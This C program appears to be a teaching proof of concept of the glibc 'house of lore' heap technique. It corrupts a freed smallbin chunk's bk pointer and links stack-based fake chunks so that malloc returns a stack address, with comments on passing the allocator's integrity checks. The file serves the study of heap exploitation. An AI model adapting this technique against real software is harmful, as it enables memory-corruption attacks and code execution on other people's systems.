#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

struct small_chunk {
  size_t prev_size;
  size_t size;
  struct small_chunk *fd;
  struct small_chunk *bk;
  char buf[0x64];               // chunk falls in smallbin size range
};

int main() {
  struct small_chunk fake_chunk, another_fake_chunk;
  struct small_chunk *real_chunk;
  unsigned long long *ptr, *victim;
  int len;

  printf("%p\n", &fake_chunk);

  len = sizeof(struct small_chunk);

  // Grab two small chunk and free the first one
  // This chunk will go into unsorted bin
  ptr = malloc(len);
  printf("%p\n", ptr);
  // The second malloc can be of random size. We just want that
  // the first chunk does not merge with the top chunk on freeing
  printf("%p\n", malloc(len));
  free(ptr);

  real_chunk = (struct small_chunk *)(ptr - 2);
  printf("%p\n", real_chunk);

  // Grab another chunk with greater size so as to prevent getting back
  // the same one. Also, the previous chunk will now go from unsorted to
  // small bin
  printf("%p\n", malloc(len + 0x10));

  // Make the real small chunk's bk pointer point to &fake_chunk
  // This will insert the fake chunk in the smallbin
  real_chunk->bk = &fake_chunk;
  // and fake_chunk's fd point to the small chunk
  // This will ensure that 'victim->bk->fd == victim' for the real chunk
  fake_chunk.fd = real_chunk;

  // We also need this 'victim->bk->fd == victim' test to pass for fake chunk
  fake_chunk.bk = &another_fake_chunk;
  another_fake_chunk.fd = &fake_chunk;

  // Remove the real chunk by a standard call to malloc
  printf("%p\n", malloc(len));

  // Next malloc for that size will return the fake chunk
  victim = malloc(len);
  printf("%p\n", victim);

  return 0;
}